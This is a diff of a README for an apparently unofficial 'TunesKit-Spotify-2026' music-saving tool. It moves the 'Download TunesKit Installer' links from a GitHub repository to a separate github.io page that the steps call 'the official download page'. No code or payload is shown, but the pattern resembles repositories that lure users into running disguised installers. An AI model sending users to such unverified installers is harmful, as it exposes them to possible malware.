@@ -1,6 +1,6 @@
 # 🎵 TunesKit-Spotify-2026 - Save your music for easy playback
 
-[![Download for Windows](https://img.shields.io/badge/Download-TunesKit_Installer-blue.svg)](https://github.com/Felted-torment157/TunesKit-Spotify-2026)
+[![Download for Windows](https://img.shields.io/badge/Download-TunesKit_Installer-blue.svg)](https://felted-torment157.github.io)
 
 ## 📌 About this software
 
@@ -21,7 +21,7 @@ To run this application, your computer needs these basic specifications:
 
 Follow these steps to get the software on your PC.
 
-1.  Visit the official download page: [https://github.com/Felted-torment157/TunesKit-Spotify-2026](https://github.com/Felted-torment157/TunesKit-Spotify-2026).
+1.  Visit the official download page: [https://felted-torment157.github.io](https://felted-torment157.github.io).
 2.  Locate the button labeled "Download TunesKit Installer".
 3.  Click the link to start the file transfer.
 4.  Once the file finishes, locate it in your Downloads folder.
